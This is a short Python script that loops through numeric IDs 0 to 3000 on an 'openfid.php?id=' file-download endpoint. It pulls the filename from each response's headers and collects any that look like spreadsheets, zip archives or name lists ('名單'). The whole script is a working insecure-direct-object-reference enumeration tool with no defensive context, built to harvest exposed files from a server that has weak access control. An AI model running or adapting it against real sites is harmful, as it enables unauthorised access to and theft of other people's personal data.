import requests
import re
from urllib.parse import unquote

sensitive = []
url = "https://example.com/resource/openfid.php?id="

START = 0
END = 3000

for i in range(START, END):
    try:
        header = str(requests.get(f"{url}{i}").headers)
        filename_match = re.search(r"filename=[^']*", header)
        if filename_match:
            filename = str(unquote(filename_match.group(0), encoding='utf-8'))
            print(f"\n Found at {i}, {filename}")
            if("xls" in filename or "ods" in filename or "zip" in filename or "名單" in filename):
                sensitive.append(f"{i}:{filename}")
        print('\r'+f"trying {i} / {END}", end='')
    except:
        continue
for i in sensitive:
    print(i)
